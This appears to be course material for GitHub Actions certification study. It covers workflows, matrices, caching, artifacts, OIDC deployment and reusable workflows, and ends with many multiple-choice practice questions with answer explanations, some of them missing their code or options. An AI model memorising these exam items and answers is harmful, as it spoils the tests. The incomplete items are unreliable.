The push was rejected because the histories had diverged. git pull, with its default merge behaviour, then merged the old remote commits back into the rebased ones. That produced duplicate commits plus a merge commit. To fix it, I find the rebased tip in git reflog from just before the pull. Then I run git reset --hard to that tip and check the log is clean. If I am the only person on the branch, I push with git push --force-with-lease. If others use it, I agree with them first. The lesson is that after rebasing your own branch, a rejected push is expected, and the right response is --force-with-lease, not git pull. Shared branches should not be rebased at all.
keyPoints: A rebase creates new SHAs, so the remote diverges
git pull merged the old commits back, creating duplicates
Recover with git reflog and git reset --hard to the rebased tip
Push with --force-with-lease only if the branch is yours alone
Do not rebase shared branches

steps.overview: This step teaches continuous integration (CI) with GitHub Actions: how workflows, jobs, steps, runners and triggers fit together, and how to make pipelines fast, secure and reusable. These topics are the core of the GitHub Actions certification. They also appear in the AZ-400 and DOP-C02 exams and in almost every DevOps interview. By the end you will have a pull-request pipeline that lints, tests and builds on two runtime versions and blocks bad merges.
objectives: Write a workflow YAML file with triggers, jobs, steps, runners and least-privilege permissions.
Configure a matrix build across two Node.js or Python versions, and add dependency caching and artifacts.
Use secrets, environments and OIDC to deploy to a cloud account without long-lived access keys.
Refactor duplicated pipeline logic into reusable workflows and composite actions.
Enforce CI results on pull requests with required status checks, so that a failing test blocks the merge.

concepts.explanation: A workflow is a YAML file in .github/workflows/ that runs when its trigger fires. A workflow contains jobs. Jobs run in parallel by default, unless you chain them with needs:. Each job runs on its own fresh runner and has ordered steps. A step either runs a shell command (run:) or calls an action (uses:).

A runner is the machine that executes a job. You select it with runs-on:. GitHub-hosted runners such as ubuntu-latest, windows-latest and macos-latest are fresh VMs for every job. Self-hosted runners are your own machines, targeted by labels. Avoid self-hosted runners on public repos, because a fork's pull request could run untrusted code on them.

Common events are push, pull_request, workflow_dispatch (manual run), schedule (cron, in UTC), workflow_call (reusable workflow) and release. You can narrow an event with filters such as branches, paths and types. pull_request runs in the context of the PR merge commit. pull_request_target runs in the base repo context with access to secrets, so never use it to check out and run untrusted PR code.

strategy.matrix creates one job for each combination of values, for example node-version: [22, 24]. Use include and exclude to add or remove specific combinations. fail-fast defaults to true, which cancels the other matrix jobs when one fails. max-parallel limits how many matrix jobs run at the same time.

A cache (actions/cache, or the built-in cache option of setup-node or setup-python) reuses dependencies between workflow runs. It is keyed by something like a hash of the lockfile. An artifact (actions/upload-artifact and download-artifact) stores files produced by a run, such as build output or test reports. Use artifacts to pass files between jobs or to keep them for later download. In short: cache is for speed, artifacts are for outputs.

Secrets are encrypted values stored at the repository, environment or organisation level. You read them with ${{ secrets.NAME }}, and they are masked in logs. An environment (for example production) can have protection rules: required reviewers, wait timers and branch restrictions. It can also hold its own secrets, which a job receives only when it references environment: production and passes the rules.

With OIDC, the workflow asks GitHub for a short-lived OIDC token. The cloud provider (AWS IAM, Azure Entra ID or GCP) trusts GitHub's issuer and exchanges that token for temporary credentials. The job needs permissions: id-token: write. The cloud trust policy should check the sub claim, for example repo:org/repo:ref:refs/heads/main or repo:org/repo:environment:production. This removes long-lived keys from your secrets.

GitHub creates a GITHUB_TOKEN automatically for each job and revokes it when the job ends. Its scope is controlled by the permissions: key at workflow or job level. Best practice is to set read-only defaults, such as contents: read, and grant extra permissions only where a job needs them. Events triggered by GITHUB_TOKEN (for example a push it makes) do not start new workflow runs, except workflow_dispatch and repository_dispatch.

A reusable workflow is triggered with on: workflow_call and can declare inputs, secrets and outputs. A caller uses it at the job level, as in jobs.x.uses: org/repo/.github/workflows/ci.yml@v1. Pass secrets explicitly or with secrets: inherit. A reusable workflow defines whole jobs, including their runners.

A composite action is an action.yml file with runs.using: composite. It bundles several steps into a single step. Every run: step inside it must declare shell:. It is used at the step level, so it runs on the caller's runner. Use it to share step sequences, and use reusable workflows to share whole jobs.

keyFacts: Workflow files must be in .github/workflows/ and end in .yml or .yaml.
On GitHub-hosted runners the default job timeout is 360 minutes (6 hours). Set timeout-minutes to fail faster.
A matrix can generate at most 256 jobs per workflow run.
The default cache storage is 10 GB per repository. Cache entries not accessed for 7 days are evicted, and the oldest entries are evicted first when the limit is reached.
Artifacts and logs are kept for 90 days by default. You can change this with retention-days or in repository settings.
Workflows triggered by pull_request from a fork get no repository secrets and only a read-only GITHUB_TOKEN.
OIDC needs permissions: id-token: write. Without it, the token request fails.
To block merges, add the CI job names as required status checks in branch protection or a ruleset. A failing job alone does not block a merge.
Pin third-party actions to a full commit SHA for supply-chain safety. Tags like @v4 are convenient but mutable.
Use concurrency: with cancel-in-progress: true to cancel older runs for the same PR or branch.

example.caption: PR pipeline: lint, test and build on Node 22 and 24 with npm caching and a build artifact (.github/workflows/ci.yml)
example.code:
name: ci
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    strategy:
      fail-fast: false
      matrix:
        node-version: [22, 24]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
      - run: npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: dist-node${{ matrix.node-version }}
          path: dist/

pitfalls: Assuming a red check blocks the merge. It blocks the merge only after you mark it as a required status check. With a matrix, require each matrix job by its exact name, for example 'build (22)' and 'build (24)'.
Using the same artifact name in every matrix job. Since upload-artifact v4, names must be unique within a run, so include the matrix value in the name.

Caching with a key that never changes, or caching node_modules directly. Key the cache on the lockfile hash and cache the package manager's cache directory, which setup-node does for you. Run npm ci, not npm install.
Forgetting permissions: id-token: write for OIDC, or writing a cloud trust policy with a wildcard sub claim. A wildcard lets any branch or fork assume the role.
Using pull_request_target, then checking out and running the PR's code. This exposes secrets to untrusted contributors.
Mixing up the two reuse tools. A reusable workflow is called with uses: at the job level. A composite action is called with uses: at the step level, and every run step inside it needs shell:.

workflow.title: From pull request to merge-blocking CI

steps.label: Developer opens pull request
steps.detail: The pull_request event against main triggers ci.yml on GitHub-hosted Ubuntu runners.

steps.label: Matrix fans out jobs
steps.detail: strategy.matrix creates one job per Node version, here build (22) and build (24), and they run in parallel.

steps.label: Restore dependency cache
steps.detail: setup-node looks up a cache keyed on package-lock.json. On the second run it hits, so npm ci finishes much faster.

steps.label: Lint, test and build
steps.detail: Each step must exit with code 0, and any non-zero exit fails the job and marks the check red.

steps.label: Upload build artifact
steps.detail: The dist/ output is stored with a unique name per matrix leg, for download or for use by later jobs.

steps.label: Required checks gate merge
steps.detail: Branch protection or a ruleset lists both matrix jobs as required, so a broken test disables the merge button.

steps.label: Deploy via OIDC environment
steps.detail: A later job with environment: production and id-token: write assumes a cloud role with short-lived credentials after approval.

project.title: gha-ci-node-demo
project.summary: A tiny Node.js price library whose GitHub Actions pipeline lints, tests on Node 22 and 24 with a matrix, builds, and uploads an artifact on every pull request. A local composite action handles setup and npm caching. The same workflow can be called as a reusable workflow, and a deploy job on main uses an environment and OIDC to reach AWS without long-lived keys.
project.run:
npm install
npm run lint
npm test
npm run build
git add . && git commit -m "Add CI" && git push -u origin main

files.code:
# Composite action: bundles repeated steps into one reusable step.
# Used inside a job as: uses: ./.github/actions/setup-node-deps
# The repo must be checked out first, because this action lives in the repo.
name: Setup Node and install dependencies
description: Install Node, restore the npm cache, run npm ci

inputs:
  node-version:
    description: Node.js major version to install
    required: true
    default: "22"

runs:
  using: composite
  steps:
    - name: Set up Node ${{ inputs.node-version }}
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        # Built-in caching of ~/.npm. The cache key is a hash of package-lock.json,
        # so the second run restores it and installs faster.
        cache: npm

    - name: Install exact dependencies from the lockfile
      run: npm ci
      shell: bash # composite run steps must declare a shell

name: CI

on: # triggers
  pull_request:
    branches: [main] # every PR into main
  push:
    branches: [main]
  workflow_call: # also makes this a reusable workflow for other repos

permissions:
  contents: read # least privilege for GITHUB_TOKEN

jobs:
  lint:
    runs-on: ubuntu-latest # GitHub-hosted runner
    steps:
      - uses: actions/checkout@v4
      - uses: ./.github/actions/setup-node-deps
        with: { node-version: "22" }
      - run: npm run lint

  test:
    name: test (node ${{ matrix.node }})
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false # let both versions report results
      matrix:
        node: ["22", "24"] # one job per version, run in parallel
    steps:
      - uses: actions/checkout@v4
      - uses: ./.github/actions/setup-node-deps
        with: { node-version: "${{ matrix.node }}" }
      - run: npm test # a failing test fails this required check

  build:
    needs: [lint, test] # runs only if lint and all test jobs pass
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: ./.github/actions/setup-node-deps
        with: { node-version: "22" }
      - run: npm run build
      - uses: actions/upload-artifact@v4 # artifact = build output to keep
        with:
          name: dist
          path: dist/
          retention-days: 7

  deploy:
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    needs: build
    runs-on: ubuntu-latest
    environment: production # approvals and env secrets/vars apply here
    permissions:
      contents: read
      id-token: write # lets the job request an OIDC token
    steps:
      - uses: actions/download-artifact@v4
        with: { name: dist, path: dist }
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }} # no access keys stored
          aws-region: ap-south-1
      - run: aws s3 sync dist "s3://${{ vars.BUCKET_NAME }}" --delete

# gha-ci-node-demo

Step 3 sample: CI with GitHub Actions for a small Node.js library.

## What each file shows
- `src/price.js`, `test/price.test.js`: the code and the tests (node:test).
- `eslint.config.js`: lint rules used by the `lint` job.
- `.github/actions/setup-node-deps/action.yml`: a composite action (setup-node + npm cache + npm ci).
- `.github/workflows/ci.yml`: triggers, jobs, steps, runners, matrix (Node 22 and 24), artifact upload,
  least-privilege `permissions`, `workflow_call` (reusable), and an OIDC deploy job with an environment.

## Run locally
```
npm install        # creates package-lock.json; commit it (npm ci and caching need it)
npm run lint
npm test
npm run build
```

## Checkpoint
1. Push to GitHub. In Settings > Branches (or Rulesets), protect `main`.
   Require status checks: `lint`, `test (node 22)`, `test (node 24)`, `build`.
2. Open a PR that changes `1180` to `1200` in the GST test. The test jobs fail, so Merge is blocked.
3. Re-run a green workflow. The setup-node log shows `Cache restored`, and `npm ci` is faster.

## OIDC deploy (optional)
- In AWS, add an IAM OIDC provider for `token.actions.githubusercontent.com`.
- Create a role whose trust policy limits `sub` to `repo:<owner>/<repo>:environment:production`.
- Create a `production` environment. Add variables `AWS_ROLE_ARN` and `BUCKET_NAME`.

## Exam notes
- Cache = speed up dependencies between runs. Artifact = keep or share job outputs.
- Secrets are masked in logs. Secrets are not passed to workflows triggered from forked PRs
  (GITHUB_TOKEN is read-only there).
- `id-token: write` is required for OIDC. Short-lived tokens replace long-lived keys.
- Reusable workflow = whole jobs (`workflow_call`). Composite action = steps inside one job.

revision.examFocus: This step maps to the GitHub Actions exam domains on authoring and maintaining workflows, consuming workflows, authoring actions, and managing Actions securely at organisation or enterprise level. It also feeds the AZ-400 objectives on designing build pipelines with GitHub Actions. Questions are usually short YAML snippets or scenarios: you pick the right trigger, keyword, permission or reuse tool, or spot the security mistake.

compare.difference: A reusable workflow replaces whole jobs, can pick its own runner and can use environments. A composite action bundles steps that run inside the caller's job and on the caller's runner.
compare.chooseA: Pick it when teams must share a full pipeline (several jobs, runners, environments, deployment gates) and you want one central place to control it.
compare.chooseB: Pick it when you want to package a few repeated steps, such as setup, lint and cache, so they can be dropped into any job.

compare.difference: Cache is an optional speed-up reused across runs and keyed by a hash. Artifacts are build outputs passed between jobs in a run or downloaded by people, and they are kept for a retention period.
compare.chooseA: Choose cache for dependencies that can be rebuilt, like the npm or pip cache, where a miss just means a slower run.
compare.chooseB: Choose artifacts when a later job or a human must receive the exact file, such as a test report, a dist folder or a binary.

compare.difference: pull_request runs in the context of the PR's merge commit, with no secrets for forks. pull_request_target runs in the base branch context, with secrets and a write-capable token.
compare.chooseA: Use it for building and testing contributor code. This is the safe default for CI.
compare.chooseB: Use it only for metadata tasks such as labelling or commenting, and never to check out and run the PR's code.

compare.difference: GITHUB_TOKEN is automatic and scoped to the current repository. It expires when the job ends, and events it causes do not trigger new workflow runs, except workflow_dispatch and repository_dispatch.
compare.chooseA: Use it for anything inside the same repo: commenting, pushing tags, creating releases, uploading packages.
compare.chooseB: Use a GitHub App token (preferred over a PAT) when you need access to another repository or when the push must trigger downstream workflows.

compare.difference: A GitHub-hosted runner is a fresh VM that GitHub maintains and discards after each job. A self-hosted runner is your machine: it persists between jobs and can reach private networks.
compare.chooseA: Pick hosted runners for the lowest maintenance and a clean, isolated environment, especially in public repos.
compare.chooseB: Pick self-hosted runners for special hardware, access to private networks, or custom tooling, and keep them out of public repos where forks could run code.

cues.cue: no long-lived cloud credentials stored in GitHub
cues.pick: OIDC with permissions: id-token: write and a cloud role trusting token.actions.githubusercontent.com
cues.why: The cloud swaps a short-lived GitHub-signed token for temporary credentials, so no key is ever stored.

cues.cue: restrict which branch or environment can assume the role
cues.pick: An exact sub claim condition, e.g. repo:org/app:environment:prod or repo:org/app:ref:refs/heads/main
cues.why: The sub claim identifies the repo and context, and a wildcard opens the role to any branch or PR.

cues.cue: require manual approval before deploying to production
cues.pick: An environment with required reviewers, referenced by environment: in the job
cues.why: Environment protection rules pause the job, and environment secrets are only released after approval.

cues.cue: share a value from one job to a later job
cues.pick: Write to $GITHUB_OUTPUT, declare job outputs:, and read needs.<job>.outputs.<name>
cues.why: Jobs run on separate runners, so data passes through outputs (small strings) or artifacts (files).

cues.cue: one matrix leg fails and the others get cancelled
cues.pick: strategy: fail-fast: false (or continue-on-error for an experimental leg)
cues.why: fail-fast defaults to true, which cancels the remaining in-progress matrix jobs.

cues.cue: push made by the workflow did not start the next workflow
cues.pick: Use a GitHub App token or PAT, or trigger via workflow_dispatch / repository_dispatch
cues.why: Events created with GITHUB_TOKEN are deliberately blocked from starting new runs, which prevents loops.

cues.cue: least privilege for the token
cues.pick: A top-level permissions: block (e.g. contents: read), widened per job only where needed
cues.why: Once you set any permission explicitly, every permission you do not list becomes none.

cues.cue: run only when files in a folder change
cues.pick: on: push/pull_request with paths: or paths-ignore:
cues.why: Path filters skip the whole workflow for unrelated changes and save runner minutes.

scenario.situation: A team's Node.js CI runs on every pull request with a matrix of Node 22 and 24. They also want to deploy to AWS from main after approval. Currently an AWS access key is stored as a repository secret, and a contributor's fork PR recently failed with 'credentials not found'. The security team wants no stored keys and wants only main, after approval, to be able to deploy. What should the engineer do?
reasoning: The fork failure is expected: pull_request from a fork gets no secrets. Switching to pull_request_target to fix it would expose secrets, so reject that option.
'No stored keys' points to OIDC. Any answer that rotates or encrypts the access key still stores a long-lived key, so eliminate it.
'Approval' points to a GitHub environment (e.g. production) with required reviewers. Branch protection alone gates merges, not deployments.

The deploy job needs permissions: id-token: write and environment: production. The IAM role trust policy must match aud sts.amazonaws.com and the exact sub repo:org/app:environment:production, not a wildcard.
Keep PR CI free of cloud access, so fork PRs still lint, test and build safely.
scenario.answer: Delete the access key. Then create an IAM OIDC identity provider and a role whose trust policy matches the exact environment:production sub claim. Run the deploy job with id-token: write and a protected production environment. This gives short-lived credentials and approval gating, and fork PRs stay untrusted.

memoryAids: Cache = Cheap to lose, Across runs. Artifact = Actual output, Across jobs.
Reuse level: Workflow replaces a Whole job (job-level uses:). Composite adds a few Steps (step-level uses:, shell: on every run).
OIDC triple: ID-token write, Issuer trusted, Identity (sub) exact.
cheatSheet: Hierarchy: workflow > jobs (run in parallel unless needs:) > steps (run in order on the same runner, sharing the workspace).
Steps in one job share files. Different jobs share nothing unless you use artifacts, outputs or cache.
Reusable workflow: callee uses on: workflow_call. Caller uses jobs.<id>.uses: owner/repo/.github/workflows/file.yml@ref, with with: and secrets: (or secrets: inherit).
Matrix extras: include adds or extends combinations, exclude removes them, max-parallel throttles them, and fail-fast defaults to true.
Cache key pattern: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}, with restore-keys as a prefix fallback.
setup-node with cache: npm (or setup-python with cache: pip) handles caching for you. Then run npm ci.
Secret precedence: environment secret beats repository secret, which beats organisation secret with the same name. Secrets are masked in logs.
Secrets cannot be used directly in if: conditions. Map them to env first and test the env value.
Expressions: ${{ }}; contexts include github, env, secrets, matrix, needs, runner, inputs; status functions are success(), failure(), always(), cancelled().
workflow_dispatch enables manual runs with inputs. schedule uses cron in UTC and runs on the default branch.
A merge is blocked only by a required status check or ruleset. Require each matrix job name, or add a single summary job that needs all of them.

Harden pipelines: pin actions to a SHA, use least-privilege permissions:, avoid self-hosted runners on public repos, and never put untrusted ${{ github.event.* }} values directly into run: (script injection).
selfCheck: I can write a PR workflow with a two-version matrix, lockfile-keyed caching, and uniquely named artifacts, from memory.
I can explain why a red check did not block a merge, and fix it with branch protection or a ruleset.
I can configure OIDC to AWS or Azure end to end, including the permissions block and a tightly scoped sub claim.
I can decide between a reusable workflow and a composite action for a given scenario, and write the correct uses: syntax for each.
I can spot unsafe patterns in a YAML snippet: pull_request_target with checkout of PR code, wildcard trust, unpinned actions, and script injection.
I can pass data between jobs using outputs and artifacts, and gate a deployment with an environment's required reviewers.

objective.question: A team adds a new CI workflow to its repository, but it never runs on pull requests. Which file path and name will GitHub Actions recognise as a workflow?
options: .github/workflows/ci.yaml
workflows/ci.yml at the repository root
.github/workflow/ci.json
.github/actions/ci.yml
objective.explanation: Workflow files must be in the .github/workflows/ directory and end in .yml or .yaml. The .github/actions/ path is a common place for local actions, not workflows, and JSON files or other directories are ignored.

objective.question: Your PR workflow runs a test job. A developer pushes a broken test. The job fails with a red cross, but the developer can still click Merge. What is the correct fix?
options: Add the test job's check name as a required status check in branch protection or a ruleset for the target branch
Add if: failure() to a final step that exits with code 1
Set fail-fast: true in the matrix strategy
Add continue-on-error: false to the test job
objective.explanation: A failing job alone does not block a merge. Merges are blocked only when the check is marked as required in branch protection or a ruleset. continue-on-error is already false by default, and fail-fast only cancels other matrix jobs.

objective.question: A deploy job uses aws-actions/configure-aws-credentials with role-to-assume to get short-lived AWS credentials via OIDC. It fails because it cannot request an OIDC token. The workflow sets permissions: contents: read at the top level. What is missing?
options: permissions: id-token: write for the job or workflow
The workflow must run on a self-hosted runner inside AWS
permissions: actions: write
An AWS_SECRET_ACCESS_KEY repository secret
objective.explanation: Requesting an OIDC token needs id-token: write. Once you set any permissions block, unlisted scopes default to none, so the token request fails. OIDC exists so you do not need long-lived keys, and it works on GitHub-hosted runners.

objective.question: A build job produces a dist/ folder. A later deploy job in the same workflow run, on a different runner, must use exactly those files. Which approach fits?
options: actions/upload-artifact in the build job and actions/download-artifact in the deploy job, with needs: build
Write dist/ to $GITHUB_ENV so the next job can read it
Commit dist/ back to the branch from the build job
actions/cache with a key based on github.sha
objective.explanation: Artifacts are made for passing outputs between jobs and keeping them after the run. Caches speed up dependency restores and can be evicted, so you should not rely on them. $GITHUB_ENV only sets environment variables for later steps in the same job.

objective.question: A workflow has this matrix: os: [ubuntu-latest, windows-latest], node: [22, 24], with exclude: - os: windows-latest, node: 22. How many jobs does the matrix create?
objective.explanation: Two OS values times two Node versions gives 4 combinations. Excluding one leaves 3 jobs. A matrix can generate at most 256 jobs per workflow run.

objective.question: An open-source repository triggers CI on pull_request. Pull requests from forks fail at a step that reads secrets.SONAR_TOKEN, because the value is empty. A teammate suggests switching to pull_request_target and checking out the PR head commit. What is the best response?
options: Store the token as a plain-text env value in the workflow file
Give GITHUB_TOKEN write-all permissions so forks can read secrets

Explain that the empty secret is expected for fork PRs, and that running untrusted fork code under pull_request_target with secrets is a serious security risk. Skip or separate the secret-dependent step instead
Agree, because pull_request_target is the safe trigger for forks
objective.explanation: Workflows triggered by pull_request from a fork get no repository secrets and only a read-only GITHUB_TOKEN. This is by design. pull_request_target runs with the base repository's secrets and a write token, so checking out and running fork code there can leak secrets.

objective.question: A security review flags this line: uses: some-vendor/setup-tool@v3. What change best reduces supply-chain risk while keeping the same action?
options: Pin it to the full 40-character commit SHA of the reviewed release, and add a comment noting the version
Change it to @v3.1 because minor tags cannot be moved
Download the action at runtime with curl
Change it to @main so you always get the latest fixes
objective.explanation: Tags such as @v3 or @v3.1 are mutable. Someone could move them to point at malicious code. A full commit SHA is immutable. @main is even riskier, and curl skips the review and pinning entirely.

objective.question: Developers push several commits to a PR within a minute. Each push starts a full CI run, and the runner queue backs up. Which addition cancels the older runs for the same PR?
options: strategy: max-parallel: 1
timeout-minutes: 5 on every job
on: pull_request: types: [opened] only
concurrency: group: ${{ github.workflow }}-${{ github.ref }} with cancel-in-progress: true
objective.explanation: A concurrency group keyed on workflow and ref, with cancel-in-progress: true, cancels older in-progress runs for the same PR or branch. max-parallel only limits matrix parallelism. A short timeout would kill valid runs, and limiting triggers to opened would skip CI on new commits.

objective.question: A platform team wants every service repository to run the same multi-job pipeline: lint, test and a deploy job that uses a protected environment. Each service repository should call it with a few inputs. What should they build?
options: A Docker container action
A workflow_dispatch workflow that each repository triggers through the API
A reusable workflow with on: workflow_call, called with jobs.<id>.uses
A composite action, called as a step
objective.explanation: Reusable workflows hold whole jobs, so they can include their own runners, environments and secrets, and the caller uses them at job level. A composite action bundles steps that run inside a single job of the caller, so it cannot define jobs or environments.

objective.question: A repository's npm cache hit reliably until the team stopped pushing during a 10-day holiday. The first run afterwards missed the cache, even though package-lock.json had not changed. Why?
options: GitHub evicts cache entries that have not been accessed for 7 days
Artifacts' 90-day retention removed the cache
The 256-job matrix limit was exceeded
Caches always expire after 24 hours
objective.explanation: Cache entries not accessed for 7 days are evicted. When the repository hits its storage limit (10 GB by default), the oldest entries are evicted first. Artifact retention is a separate setting and does not affect caches.

objective.question: In this matrix job, the Node 20 leg fails, and GitHub immediately cancels the Node 22 and Node 24 legs. The team wants every version to finish so they can see all failures in one run, while the run still fails. What should they change?

code.code:
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [20, 22, 24]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci && npm test

options: Set strategy.fail-fast: false
Set strategy.max-parallel: 3
Add concurrency with cancel-in-progress: false
Add continue-on-error: true to the npm test step
objective.explanation: fail-fast defaults to true, so one failing matrix leg cancels the rest. Setting it to false lets every leg finish, and the run still fails. continue-on-error would hide the failure, max-parallel only limits how many legs run at once, and concurrency controls separate runs, not matrix legs.

objective.question: The build job computes a version string. The deploy job must print it. Which expression should replace ___?

code.code:
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.ver.outputs.version }}
    steps:
      - id: ver
        run: echo "version=1.4.2" >> "$GITHUB_OUTPUT"
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ___"

options: ${{ needs.build.outputs.version }}
${{ env.version }}
${{ jobs.build.outputs.version }}
${{ steps.ver.outputs.version }}
objective.explanation: A job output is read in a dependent job through the needs context, so the expression is needs.build.outputs.version. The steps context only covers steps in the current job, and the jobs context is not used this way inside a normal workflow. The value was never set as an environment variable, so env.version is empty.

objective.question: A CI workflow uses on: pull_request with paths: ['src/**'], and its test job is a required status check. A PR that changes only README.md can never be merged. The check shows 'Expected — Waiting for status to be reported'. What is the best fix that keeps the quality gate?
options: Add a workflow_dispatch trigger so maintainers can run it by hand
Remove the test job from required status checks
Run the workflow on every pull request, detect changed files inside the run, and skip the expensive work with a job-level if condition
Add paths-ignore: ['**.md'] next to paths
objective.explanation: When path filtering skips a whole workflow, its required checks are never reported, so they stay pending and block the merge. A job skipped by an if condition reports as successful, so the gate passes for docs-only PRs and still runs for code changes. Removing the required check weakens the gate, and the other two options do not report the status.

objective.question: A team writes this composite action. Workflows that use it fail before any step runs, with an error about the action's metadata. What is the problem?

code.code:
name: setup-and-lint
description: Install deps and lint
runs:
  using: composite
  steps:
    - run: npm ci
    - run: npm run lint

options: Each run step in a composite action must declare a shell, for example shell: bash
The file must be named workflow.yml, not action.yml
Composite actions must declare runs-on: ubuntu-latest
Composite actions cannot run npm commands
objective.explanation: In a composite action, every run step must set shell explicitly. Composite actions run on the caller's runner, so runs-on does not belong in action.yml. They can run any command, and the metadata file must be named action.yml or action.yaml.

objective.question: An IAM role trust policy only allows token.actions.githubusercontent.com:sub equal to repo:acme/app:ref:refs/heads/main. The deploy job runs on main and has id-token: write, but AssumeRoleWithWebIdentity is denied. The job recently gained environment: production. Why?
options: The aud claim changes to the environment name
Environments require long-lived AWS keys stored as environment secrets
When a job references an environment, the sub claim becomes repo:acme/app:environment:production, which the trust policy does not match
OIDC tokens do not work on jobs that use environments
objective.explanation: For jobs that use an environment, GitHub puts the environment, not the branch ref, in the sub claim. The trust policy must allow repo:acme/app:environment:production, which is also a tighter and better condition. The audience claim does not change to the environment name, and OIDC works with environments.

objective.question: A workflow auto-formats code on a PR branch and pushes a fix commit using the default GITHUB_TOKEN. The CI workflow, which triggers on pull_request, does not run for the new commit, so required checks are missing. What explains this, and what is a common fix?
options: GITHUB_TOKEN lacks contents: write. Grant it so that CI triggers.
Pull request workflows ignore commits made by bots. Enable bot triggers in repository settings.
Events caused by GITHUB_TOKEN do not start new workflow runs, except workflow_dispatch and repository_dispatch. Push with a GitHub App installation token instead.
The commit needs [ci] in the message. Add it to the commit message.
objective.explanation: GitHub blocks events created by GITHUB_TOKEN from triggering new runs, to prevent recursive loops. Using a GitHub App token, or a fine-grained PAT, makes the push trigger CI. The push already succeeded, so contents: write was not the problem, and the other two options describe features that do not exist.

objective.question: This matrix job sometimes fails with 'Conflict: an artifact with this name already exists on the workflow run'. You need a separate coverage report from each Node version. What is the best fix?

code.code:
strategy:
  matrix:
    node: [22, 24]
steps:
  - uses: actions/checkout@v4
  - uses: actions/setup-node@v4
    with:
      node-version: ${{ matrix.node }}
  - run: npm ci && npm test
  - uses: actions/upload-artifact@v4
    with:
      name: coverage
      path: coverage/

options: Change the name to coverage-${{ matrix.node }}
Set retention-days: 1 so the old artifact expires first
Pin actions/upload-artifact back to v3
Add overwrite: true to the upload-artifact step
objective.explanation: Since upload-artifact v4, artifact names must be unique within a run, so putting the matrix value in the name gives each leg its own artifact. overwrite: true removes the conflict but deletes one leg's report. v3 is deprecated and no longer works. Retention does not affect name clashes inside one run.

objective.question: A branch ruleset on main requires the status check 'build'. The CI workflow has a job with id build that uses a matrix of node: [22, 24]. Every PR now shows 'build — Expected, waiting for status to be reported', although both matrix jobs pass. What is the cause?
options: The ruleset needs 'Require branches to be up to date' to be turned off
The workflow file must be renamed to build.yml to match the check name
Required checks do not support matrix jobs, so the matrix must be removed
Matrix jobs report as 'build (22)' and 'build (24)', so no check called 'build' is ever reported
objective.explanation: Each matrix job reports a check named after the job and its matrix values. You must require each exact name, or add one aggregating job that needs all legs and require that job instead. Required checks do work with matrices, and the workflow file name is not the check name.

objective.question: This cache 'hits' on every run for months. Install time slowly gets longer, and once a stale package caused a confusing test failure. What is the best change?

code.code:
- uses: actions/cache@v4
  with:
    path: node_modules
    key: deps
- run: npm install

options: Change the key to deps-${{ github.sha }} so every commit gets a fresh cache
Remove this step, use actions/setup-node with cache: 'npm', and run npm ci
Keep the step but run npm install --prefer-offline
Add restore-keys: deps- so partial matches are used
objective.explanation: A fixed key always matches exactly, so the cache is never saved again and grows stale. setup-node keys the npm cache directory on the lockfile hash, and npm ci installs exactly what the lockfile says. A key based on github.sha never hits on a new commit. The other options keep the static key and the node_modules caching.

objective.question: A team moves its setup steps into a composite action at .github/actions/node-setup/action.yml. The workflow below fails validation. Why?

code.code:
jobs:
  setup:
    uses: ./.github/actions/node-setup
  test:
    needs: setup
    runs-on: ubuntu-latest
    steps:
      - run: npm test

options: A job-level uses: must point to a reusable workflow file, so a composite action must be called as a step inside steps:
Composite actions need runs-on: inside action.yml
needs: cannot point to a job that has no steps
Local actions must be referenced with a full owner/repo@ref path
objective.explanation: Job-level uses: is only for reusable workflows, which are .yml files under .github/workflows. A composite action runs as a step, so it must sit under steps: after actions/checkout, because the local path must exist on the runner. Local paths like ./.github/actions/... are valid, and composite actions have no runs-on.

objective.question: You are replacing stored AWS access keys with OIDC. Put these steps in the right order. A: Add permissions: id-token: write to the deploy job. B: Create an IAM OIDC identity provider for token.actions.githubusercontent.com with audience sts.amazonaws.com. C: Use aws-actions/configure-aws-credentials with role-to-assume in the job. D: Create an IAM role whose trust policy checks the aud and sub claims. E: Attach a least-privilege permissions policy to the role.
options: D, B, E, A, C
B, E, D, C, A
B, D, E, A, C
A, C, B, D, E
objective.explanation: The identity provider must exist before a role can trust it. Next you create the role with a trust policy, then attach its permissions. On the GitHub side, the job needs id-token: write before the credentials action can request a token. A permissions policy cannot be attached to a role that does not exist yet.

objective.question: A production deploy role has this trust condition. What is the main risk?
options: Any workflow in any acme repository, on any branch or pull request, can assume the production role
Only the default branch of each acme repository can assume the role, which is too strict
The wildcard is ignored, so no workflow can assume the role
The aud condition should use StringLike instead of StringEquals
objective.explanation: repo:acme/* matches every repository in the organisation and every ref, PR and environment. A feature branch in an unrelated repo could then deploy to production. Pin the sub claim with StringEquals to something like repo:acme/app:environment:production. The aud check is correct as it is.

objective.question: A developer changes requirements.txt. On the next run, an older cache exists with key pip-Linux-<oldhash>. What happens?

code.code:
- id: cache
  uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt') }}
    restore-keys: pip-${{ runner.os }}-
- if: steps.cache.outputs.cache-hit != 'true'
  run: pip install -r requirements.txt

options: The old cache is restored, cache-hit is 'true', and the install step is skipped
The old cache is restored, cache-hit is 'false', the install step runs, and a new cache is saved under the new key if the job succeeds
The job fails because the key and the restore key do not match
Nothing is restored. The install step runs, and no new cache is saved
